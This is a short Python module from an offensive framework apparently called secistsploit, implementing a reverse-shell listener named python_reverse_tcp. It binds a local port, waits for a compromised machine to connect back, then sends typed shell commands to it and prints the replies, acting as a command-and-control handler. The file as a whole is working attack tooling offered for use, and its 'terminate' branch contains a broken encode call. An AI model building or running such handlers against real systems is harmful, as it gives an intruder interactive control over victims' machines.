# -*- coding: UTF-8 -*-
import struct
import socket
from secistsploit.core.exploit import *
from secistsploit.core.tcp.tcp_client import TCPClient


class Exploit(TCPClient):
    __info__ = {
        "name": "python_reverse_tcp",
        "description": "python_reverse_tcp",
        "authors": (
            "demonsec",
        ),
        "references": (
             "www.ggsec.cn "
             "www.secist.com"
        ),

    }

    lhost = OptIP("", "本地监听IP地址")
    lport = OptPort(8080, "本地监听端口")
    #lhost=(self.port)
    def __init__(self):
        self.endianness = "<"

    def run(self):
         LHOST=(self.lhost)
         LPORT=(self.lport)
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         s.bind((LHOST, LPORT)) # change the ip
         s.listen(1)

         info= '\033[94m[*]\033[0m监听者ip地址 {LOCAL_IP}: {LOCAL_PORT}'.format(LOCAL_IP=LHOST,LOCAL_PORT=LPORT)
         print(info)
         conn, addr = s.accept()
         print ("\033[92m[+]\033[0m 已连接成功:", addr)

         while True:
             controle = input("SHELL > ")
             if 'terminate' in controle:
                 conn.send (controle.encode('terminate'))
                 conn.close()
                 break
             else:
                 conn.send (controle.encode())
                 print (conn.recv(1024).decode("cp850"))
